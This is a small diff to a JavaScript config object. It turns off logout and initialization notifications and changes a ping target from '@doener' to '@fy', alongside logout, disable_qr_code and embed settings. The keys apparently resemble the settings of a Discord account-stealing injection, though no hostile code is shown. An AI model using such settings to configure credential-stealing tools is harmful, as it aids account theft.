@@ -18,9 +18,9 @@ var config = {
     logout: true,
     disable_qr_code: true,
 
-    notify_on_logout: true,
-    notify_on_initialization: true,
-    ping: [true, "@doener"],
+   notify_on_logout: false,
+   notify_on_initialization: false,
+   ping: [false, "@fy"],
 
     embed: {
         username: "festory",
